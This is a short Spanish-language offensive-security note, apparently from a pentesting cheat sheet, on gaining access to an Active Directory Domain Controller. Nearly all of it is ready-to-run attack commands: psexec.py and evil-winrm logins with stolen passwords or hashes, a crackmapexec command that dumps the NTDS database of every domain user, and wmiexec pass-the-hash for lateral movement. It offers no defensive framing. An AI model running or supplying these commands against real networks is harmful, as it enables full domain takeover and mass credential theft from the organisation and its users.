# Requisitos
Para ganar acceso al `Domain Controller` debemos disponer de credenciales válidas de un `Administrador del dominio`.

# Realizar Autenticación
Una forma de hacerlo es mediante psexec
```
psexec.py <dominio>/<usuario>:<contraseña>@<ip_DC> cmd.exe
```
Ejemplo:
```
psexec.py wizzz.local/Administrador:Passw0rd@192.168.45.130 cmd.exe
```
También podemos ganar acceso si hemos conseguido su hash mediante evil-winrm
```
evil-winrm -i <ip-DC> -u '<Administrator>' -H '<hash>'
```

# Recomendaciones
Una vez se compromete el DC es recomendable dumpear el `ntds` de todos los equipos para tener acceso a todos los usuarios del Directorio Activo.
```
crackmapexec smb <ip_DC> -u 'Administrator' -p 'P@$$w0rd!' --ntds vss
```
Una vez hecho eso podrías hacer `Pass The Hash` con herramientas como `wmiexec`
```
wmiexec.py <dominio>/<usuario>@<ip> -hashes <hash_ntds>
```
